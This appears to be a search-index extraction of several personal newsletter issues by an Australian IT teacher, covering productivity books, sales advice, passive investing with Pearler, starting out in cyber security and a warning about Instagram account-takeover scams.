Woo-hoo! Very excited for the holidays.\nMy wife and I, with a few friends, managed to take a short trip to Rainbow Beach for a few days. If you\u0026rsquo;re ever in Queensland, make sure to visit the sand dunes called the “Blow Hole”, it\u0026rsquo;s incredible.\nI\u0026rsquo;d love to share some lessons and content I\u0026rsquo;ve discovered over the past six or seven days I think you\u0026rsquo;ll find value in.\n🔑 Opportunities Equal Obligations Just finished chapter five of Company of One by Paul Jarvis, he wrote: “Opportunities are just obligations wearing an appealing mask.” What a quote!\nI\u0026rsquo;ve learnt over my years in the start-up space that you need to increase the surface area of luck to grow the likely-hood of having more opportunity. More opportunity isn\u0026rsquo;t bad, but it always takes more time, effort and money to maximize the success of that opportunity, which just equals obligation.\nLooking at it like an obligation really shifts things, it\u0026rsquo;s how I\u0026rsquo;m approaching all ideas and opportunities now and asking myself “what\u0026rsquo;s involved with making this work? And is it really worth it?”\n💲 My Dad\u0026rsquo;s Sales Process I asked my dad, who\u0026rsquo;s been in various sales positions through his life, what is your sales process? His goal is to vet a lead as fast as possible, either they\u0026rsquo;re someone ready to do business or they\u0026rsquo;re not someone ready to do business.\nIf they are, that path is clear, give the person more time and focus on their needs. If they are not, then tactfully conclude interaction as soon as possible with the goal to have them contact you when their situation to do business has changed and they\u0026rsquo;re ready. It\u0026rsquo;s a simple starting step toward working together.\nHow he vets a customer for those two paths is by starting general, defusing their expectation of talking business and asking personal, thoughtful questions. This puts people in clearer states of mind to get back to that sales process.\n🚪 Looking For Windows In A YouTuber I subscribe too put up a fantastic video interviewing a Michael Brown, who told his story of getting a job at Google.\nAfter 20 rejected applications he viewed this as not getting in the door of Google, so he looked outside for a window. He found a company who Google outsources hiring people for internal projects, that was his window, a new way in.\nHe contacted them and got a position as a packer in a grocery shop for Google. It wasn\u0026rsquo;t anything flash, but it was a way in. Then he looked for any opportunity to add value and solve problems. He\u0026rsquo;d send his ideas through to anyone he could after some time he got noticed and offered a newer position.\nWith a bit of out-of-box thinking and some effort, he\u0026rsquo;s gone to work on incredible projects at Google. Wow, what a story!\n👍 Newly Found Usefulness 2colors.colorion.co – Design resource for quick colour pallets\nVideo by Ali Abdaal – What makes people successful?\nArticle by Benjamin Hardy – Achieving regular flow state\nArticle on Dev – Writing a daily blog for 100 days\n💌 Thank You, Friend I\u0026rsquo;m grateful for you taking some time out of your life to read my letters.

This month\u0026rsquo;s felt long as term 3 wrapped up, lots has happened and now it\u0026rsquo;s the last term for 2021.

If you\u0026rsquo;d like to unsubscribe, see below, also, here\u0026rsquo;s last month\u0026rsquo;s newsletter.\nWhy I Do\u0026hellip; What I Do If you didn\u0026rsquo;t know, I\u0026rsquo;m an I.T. Teacher at a local institute in Australia.\nI love my job! The lifestyle, the team, the students, it\u0026rsquo;s all good, mostly.\nThis term I helped a student get hired at a local software dev company. I\u0026rsquo;m so proud of them!\nThe business that hired my student reached out to me, I explained the details to the class and shared my thoughts for applying. I essentially summarised this article on students finding work.\nAlso, another one of my classes finished after 2 years. It\u0026rsquo;s the longest time I\u0026rsquo;ve had with students, there\u0026rsquo;s a certain bond you form as a teacher. It was sad to see them go and I wish them the very best in their future.\nSince the term finished, we had a small break as it overlapped with our second wedding anniversary. We escaped to a small coastal town for a nice getaway. Holidaying 30 minutes away from home is our new favourite thing.\n\u0026lsquo;What a Pearl\u0026rsquo; Since June, I started passive investing via Vanguard, now I\u0026rsquo;m switching brokers to Pearler, see Vanguard vs Pearler. Nothing\u0026rsquo;s changed in my strategy.\nI noticed Pearler from FIRE content creators. Pearler aligns with my investing style, save and store money in low-risk containers like ETFs.\nSpeaking of shiny pearls, I\u0026rsquo;ve been distracted by an opportunity in the form of website investing. Basically, buy, renovate and sell websites for profit. It\u0026rsquo;s a digital version of property investing. Have you ever heard of or done this? Would love to hear from you.\nIf you\u0026rsquo;d like to start investing, see my guide and consider signing up to Pearler. We\u0026rsquo;ll both get a free trade worth $9.50AUD, so that\u0026rsquo;s cool.\nKeep\u0026rsquo;n It Co Let\u0026rsquo;s talk consistency. I have a long list of things I struggle with and consistency is up there.\nSince April, I\u0026rsquo;ve learnt a lot through my #100DaysOfHacking journey. However, I\u0026rsquo;ve put Cyber Sec on hold to focus on work and to have a break. I\u0026rsquo;ll be back on the hacking saddle soon.\nIn an effort to be consistent with content creation and blogging, here are my website\u0026rsquo;s monthly stats via Google Data Studio. I\u0026rsquo;ve noticed since making a few changes to the backend Google Analytics is not recording user data, not sure what\u0026rsquo;s going on there.\nIt\u0026rsquo;s great to see mrash.co slowly grow with every new blog post. Speaking of which, for this month I\u0026rsquo;ve posted two new articles, 1) Guide To SEO, and 2) Optimising WordPress, and 3) Vanguard Vs Pearler.\nNext month I\u0026rsquo;ll be going over my dreams, yep, my long term goals. This is all an effort to keep consistent.\nThanks for reading,\n","permalink":"//localhost:1313/oh-shiny/","summary":"Hey friend,\nSeptember\u0026rsquo;s come and gone!

I’ve found benefits from writing on the internet, sharing lessons and helping others, but it takes effort. Is putting yourself out there worth it?\nDisclaimer, you’ve received this newsletter as you’ve subscribed to MrAsh.co (or downloaded a freebie), if interested, read last month’s or see all newsletters.\nPut Yourself Out Let’s quickly define this, it means to be in front of others in a non-typical environment that is difficult for you. Public speaking, posting videos on YouTube, publishing a blog etc. - pick your poison.\nOkay, but why? What’s the point in going into new things, uncomfortable situations or putting in more effort than is required? The answer - unexpected delight.\nThis is known to some as increasing your Luck Surface Area, a fascinating, simple concept of doing more stuff and telling more people. It’s something Tim Ferris has touched on before regarding leadership.\nHow to do it? How do you put yourself out there?\nStart now: stop saying you’ll start doing the thing you want to do and just start. Learn as you go: aim for progression, not perfection, i.e. DO WHAT YOU CAN’T. Accept failure: mistakes are a part of learning, don’t avoid it. Enjoy the ride: fall in love with the process, not the end result. I personally have a website and a YouTube channel where I ‘put myself out’ - I can vouch for the process.\nCatch-Up \u0026amp; Next Steps A quick look back at the month and forward to next.\nMonth’s Memories\nThere has been server flooding in Queensland, Australia recently. We are lucky that we’re safe and no damage to our house happened unless, we count our dog freaking out: I’ve started making YouTube videos again, and loving it! So far there’s three videos, Linux Fundamentals Part 1, Part 2, and Part 3. I’ve published four blog posts this month also: CompTIA A+ Study Notes (220-1101), and written posts for my videos, Linux Fundamentals Part1, Part 2, and Part 3.

I’ve been back into work by setting up students for their course.\nPersonally, I’ve been slightly neglecting my morning routine and slipping on positive habits. I think getting back into work is draining me more than I was expecting. I need to find a new balance being back in work mode.\nAs always, aligning myself with my 2020 yearly review I’m writing to you. Here are my top prices of content I’m consuming or contributing.\n1. Relax More, Work Less + Procrastination I, like a lot of people have an obsession with productivity. My productivity output directly relates to my mental health, Life Kit tackles this big subject. I learnt I need a balance between being productive and relaxing. I currently have an unhealthy relationship with work and need to address it.\n2. Writing, Specializing \u0026amp; Hard Work It’s been a difficult week staying focused on my dream of being a content creator, getting back into work takes a lot of time and energy. I went on a break from thinking down the YouTube spiral.\nHow Writing Online Made me a Millionaire was a great reminder of why I’m writing. I’ve learnt that nurturing reading and writing is important to us as humans. Austin Kleon describes writing as not only a good way to understand what you’re saying, but what you’re thinking.\nIn Should You Specialize or Be a Generalist? It’s clear that these skills add to your professional tool belt. Tim Ferris recommends speaking, writing and negotiating as ‘add on’ skills to your core.\nBehind the scenes is always fun, so How I got my film on Netflix is a great look into the creative process us as builders go through… but on a WHOLE other level.\n3. Children In Business My latest podcast episode is live. A great teacher once said to be like children. How well does that apply to life through business? Here’s a deep dive into growing brain activity, personal experience and observations.\nI’ve discovered six lessons children teach us about business:\nLook Ahead with Wonder. Absorb Like Sponges.

With cybercrime on the up globally, it’s hitting here home in Australia, hear how scammers are taking over Instagram accounts.\nDisclaimer, you’ve received this newsletter as you’re subscribed to Mr Ash.co (or downloaded a freebie)/ If interested, read last month’s or see all newsletters, thanks for reading.\nStaying Safe Online Over the past few weeks, two friends of mine had their Instagram accounts taken over by a scammer. The scammer posed as a friend or work colleague and tricked them into handing over their accounts.\nThe scam focuses on hijacking and taking over accounts with social engineering. Once they trick the account owner, they lock them out, change the username, and the profile picture and upload a series of fake, stolen images. They then contact other users as the account owner to find more victims. It’s a series of stolen accounts where the scammer can start fresh with each new account, just awful.\nIn addition to stealing their account, the scammer tries to trick users into recording and uploading a video promoting their scam. Due to fear or embarrassment, victims unknowingly help the scammer, this happened to one of my friends.\nIt’s led me to talk to a few friends about basic cyber security awareness, something we should all be more aware of. It’s shined a light on the importance of password complexity and being aware of who we’re really talking to online.\nCybercrime is rampant and shows no sign of slowing down, so it’s eye-opening to see it impact people around me. Please use a password manager like Bitwarden to secure your online accounts from scammers, and never reuse passwords. The internet is a wonderful tool, it opens us up to unlimited possibilities, but it does the same for criminals.\nCatch-Up \u0026amp; Next Steps A quick look back at the month and forward to the next.\nMonths Memories\nThe Batman 2022 was released, I saw it twice in cinemas… [controversial opnion] it tops Dark Knight for me (in some ways).

There are a few area\u0026rsquo;s I struggle to commit too, writing weekly is one. I\u0026rsquo;m very committed to changing this.\nI hope you\u0026rsquo;ve been well since I last wrote, it feels like a lifetime since we\u0026rsquo;ve done this.\nIf you remember, back in my second letter I wrote about Paul Jarvis, I\u0026rsquo;ve just completed his course and am writing an article about it, stay tuned for that!!\n🎨 Staying Creative, Systematically I\u0026rsquo;m a big fan of Paul Jarvis, he\u0026rsquo;s a freelance web designer turned author and product developer. I\u0026rsquo;m slowly getting through his book Company of One and I\u0026rsquo;ve mentioned it here on the newsletter.\nIf you like the lifestyle business approach and minimalism, he creates a fantastic argument for why growing bigger isn\u0026rsquo;t always better. I must admit, I\u0026rsquo;m a big subscriber to this idea and really encourage others to pick up his book.\nI just completed his course Creative Class and I cannot recommend it enough for aspiring freelancers and new web designers. Since Paul comes from a WordPress Design/Development background, I relate to his journey a lot.\nJust a few months ago he did a Webinar with Ben Pines from Elementor and it was the perfect piece of content for me. His process-driven approach resonated with me, he gets that you can have creativity in a step-by-step project, I love it.\nYou might be interested in following him but you won\u0026rsquo;t find him on Facebook, he\u0026rsquo;s never had a profile. However, he does like Twitter so look for him there.\n📐 Measuring Progress Thanks to Ali Abddal \u0026amp; Ben Hardy, I found Dan Sullivan a master business/strategic coach who has published a few books, he\u0026rsquo;s got a free ebook called Gap and Gain, it\u0026rsquo;s worth the read, currently, I\u0026rsquo;m up to Chapter 3 and am loving how he explains our brain\u0026rsquo;s way of glorifying ideals and fantasies instead of being specific and focused.\nDan shows in order to ‘measure your progress\u0026rsquo; and be happy about what you\u0026rsquo;ve accomplished, there\u0026rsquo;s a mind shift you need to actively engage in. To oversimplify, stop day-dreaming about what other people have put before you and acknowledge the fact you have improved. It can be something as simple as reading a book, landing a job or exercising. Acknowledge what you\u0026rsquo;ve accomplished, measure your progress by saying “hey, before I read that book I didn\u0026rsquo;t know about the Geometric series, wow! That\u0026rsquo;s awesome!”.\nPersonally, I have around 10 subscribers on my newsletter and about 150 subscribers on my YouTube channel, that\u0026rsquo;s not a lot compared to what others have done, I could measure this progress to the ideal, millions and millions of subscribers, which is always a fantasy and never achievable. Or I could measure this progress to the fact as I had 0 newsletter subscribers and 0 YouTube subscribers when I started and now I have MORE, I have progressed, looking back helps to measure progress. It\u0026rsquo;s a simple mind shift, but it makes me happier to see the progress I\u0026rsquo;ve made compared to the perpetual disappointing fact of never reaching my ideal ‘horizon'.\n🏆 Traits of Success Another misconception I\u0026rsquo;m slowly breaking down and destroying is the notion that success comes from natural-born traits. This podcast episode deep dives into how so many successful entrepreneurs grow the skills needed over a long time of hard work and trial and error to have traits of success. Tim Ferris and Guys Raz gave us a heartfelt, emotional conversation around entrepreneurism, anxiety, depression and a lot more topics worth hearing.\nOne thing I\u0026rsquo;ll use here from Guy is how he explains nature vs nurture regarding traits/skills that entrepreneurs desire. He explains that we\u0026rsquo;re all Clark Kent\u0026rsquo;s, but the difference between us and the successful entrepreneurs we know is, they\u0026rsquo;re going into the phone booth.\nHow cool is that? I love it! We\u0026rsquo;re all equal, it\u0026rsquo;s the effort we put in the makes the difference.\nGuy has also released a book entitled ‘How I Built This‘, same title as his famous podcast but to me, I feel like the title has taken a new meaning with this book. I think it\u0026rsquo;s a more personal dive into Guy and his journey with all of the incredible people he\u0026rsquo;s interviewed over the years of hosting his podcast.\nIf you\u0026rsquo;ve never listened to the How I Built This Podcast, it\u0026rsquo;s worth every second of your time.\n🎓 Learning, Web Design Conversion This week I\u0026rsquo;ve been grateful for learning. How good is learning?\nThere\u0026rsquo;s something so rewarding about understanding new information or having that pin-drop moment. I\u0026rsquo;ve recently been diving into Cyber Security and deeper levels of Computer Networking. I found TryHackMe, a great interactive resource with a lot of community-driven courses, it\u0026rsquo;s a great place to start.\nElementor dropped another great webinar, this time with Talia Wolf from getuplift.co. I wrote a small write up called 4 Ways to Increase Conversions with Talia Wolf if you\u0026rsquo;re interested in checking it out.\n⚡ Something Exciting – A New Course So here is something I\u0026rsquo;ve wanted to do for a long time, create my own course. I love learning and teaching, so it\u0026rsquo;s a natural progression for me to launch something of my own.\nThe problem I have is I get these ideas, I start sketching out plans and typing away what it will look like. Then I get stopped by actually sharing or releasing my progress, I\u0026rsquo;ve ignored these feelings for a long time. What\u0026rsquo;s happening is that I\u0026rsquo;m terrified of getting backlash from others, bad comments, rejections, failure etc. It\u0026rsquo;s a long list of negative emotions that go on and it scares the hell out of me.\nLong story short I\u0026rsquo;m sick of it! So here I am, an idea I\u0026rsquo;m sharing and working on in public – Website In A Week Course (In development)\n💌 Thanks, Friends I appreciate your time reading this and would really love your support by replying to this email with any thoughts or feedback you have.\nQuestion, what are you struggling to start right now?\nFor me, it\u0026rsquo;s YouTube. I wrote a massive video script a month ago and tried recording twice and fear of failure got so real I haven\u0026rsquo;t tried again. Sucks.\nThanks again, friend!!\nHave a great day,\nAsh\nP.S.

Writing Well by Julian Shapiro If you write well, you think well. Stop reading this and go to this guide. If you\u0026rsquo;re still here, why? Spend your next 3-4 hours reading, taking notes and having your mind blown.\nYou\u0026rsquo;ll appreciate writing on a new level while understanding what good writing is. Think about how much we write and read, text messages, emails, social media posts. You could use these mediums to craft an amazing skill.\nThe author, Julian, is incredible at breaking down topics. This is the first of his three guides. I\u0026rsquo;m excited to tackle Growth Marketing next!\n2. Top of My ToDo List by Paul Graham “Don\u0026rsquo;t ignore your dreams; don\u0026rsquo;t work too much; say what you think; cultivate friendships; be happy.” Paul Graham adapted this from Bronnie Ware, a nurse. She saw the biggest regrets people had in their lives.\nIf you woke up every day and thought about these five things, would your life be better? Would you be more intentional with your time? More thoughtful with your actions? Yes, you would. I know because I\u0026rsquo;ve been doing it for the past four months.\nLife is short, Tim Urban\u0026rsquo;s The Tail End puts that into perspective. Order what\u0026rsquo;s most important to you at the top of your list, every day. Make it your mantra, like me.\n3. Foundations by MailChimp Co-Founders Dan and Ben started MailChimp with a need to serve small businesses. Their ethos was, and still is, “scale-out of the kitchen.”\nThey understand anyone starting a business needs good software and training. So they give it away for free! MailChimp and Co provide partner opportunities including their MailChimp Academy.\nI felt the company culture from a Webinar held by Jocelyn. She helped me to complete a MailChimp course. I\u0026rsquo;m now certificated as a MailChimp partner!\nThanks For Reading I\u0026rsquo;m grateful for saying “no.”\nDo you say “no” a lot? This week I did. I said it to two massive opportunities in my life. Paul Jarvis rings in my ears, “opportunities are just obligations wearing appealing masks.”\nIt\u0026rsquo;s a profound experience. I had stirs of emotion forming. It\u0026rsquo;s nerve-racking, what would people say? How will they react? Rest assured, honesty creates honesty. More on that story soon!\nI\u0026rsquo;ve taken on the Gap And Gain approach. Clarify long-term goals and match day-to-day decisions. Look at your goals, is your current path is getting you there? Do you need to say “no?”\nA story from this week\nIn the Writing Well handbook, which you\u0026rsquo;ve finished by now, right? You\u0026rsquo;ll notice a succinct writing test. Rewrite a long, overwritten, crammed, descriptive, difficult-to-read, some-what-obnoxious paragraph into a clear one. I did and tweeted @Julian.\nHe\u0026rsquo;s now on my vision board as an inspirational figure. His reply is equal to a Beilber receiving a Justin Bieber text. Okay, not quite.\nHere\u0026rsquo;s what I\u0026rsquo;ve been up to\nAre you on LinkedIn? No? Without sounding blunt, do you want a future job? LinkedIn has changed the game in several ways, my article dissects five.\nBig on sports? Here are some sports strategies that\u0026rsquo;ll help in business and on the court. And here\u0026rsquo;s a timely story of phone addiction.\nI also completed a short course on Google My Business. I\u0026rsquo;m certified from Google!\nAgain, thank you!\nI hope your upcoming week is a good one! Take some time off and enjoy time with family and friends. Remember, don\u0026rsquo;t work too much!\nThanks,\n","permalink":"//localhost:1313/todo-writing-check/","summary":"Hello friend,\nHow has your week been?

Four weeks can go so fast! October\u0026rsquo;s been about goals, dreams, and the power of compounding habits to achieve them.\nCompound, claimed to be the eighth wonder of the world (it is for investing), but what is it? Put simply, compound is the long term effects of small steps.

Something you enjoy and don\u0026rsquo;t mind if you don\u0026rsquo;t get paid for it?\nWhatever it is, set a goal, not just any goal, but a lifelong dream. Setting goals can be weird, how can you know where you\u0026rsquo;re going to be in x years? How do you stay focused on long term goals as life changes?\nFor me, I write them down and keep them top of mind. I have a \u0026lsquo;dream\u0026rsquo; section in my notion database, my digital brain (email me if you\u0026rsquo;d like a template copy). That\u0026rsquo;s where I store, track and ponder my dreams.\nHere are two of my dreams:\nIndependent Content Writer. I love writing about cyber, work-life and web, then rewriting those topics into blog articles. I\u0026rsquo;ll write for emerging education startups and the biggest tech blogs in the world. World-Class Educator. I love teaching, I\u0026rsquo;ll be among the top educators in the world. I\u0026rsquo;ll be recognised for my contributions toward technology and helping students learn. Yeah, my dreams are ambitious, even ridiculous. Isn\u0026rsquo;t that the point of dreams? They\u0026rsquo;re supposed to be BIG, so go BIGGER otherwise you\u0026rsquo;re aiming small, don\u0026rsquo;t hold yourself back.\nCatch-Up + Next Steps A quick look back at the month and forward to next.\nMonths Memories\nMy wife\u0026rsquo;s starting her second freelancing business, social media management and content creation for other small businesses. We house-sat for family in a cute country town, I wrote Beginner Security Analysis there. We went to my wife\u0026rsquo;s hometown for a high school reunion, concert performance from both students and hired professionals. I became besties with the sound guy. My wife\u0026rsquo;s family moved houses and they have a pool! It\u0026rsquo;s gonna be a good Aussie summer this year! I\u0026rsquo;ve listened to great podcasts like How Built The Tim Ferriss Show, Lotería and Cloud Hopper. I finished reading Show Your Work by Austin Kleon. This has been my favourite mindset, entrepreneur, self-help book to date, which I highly recommend.
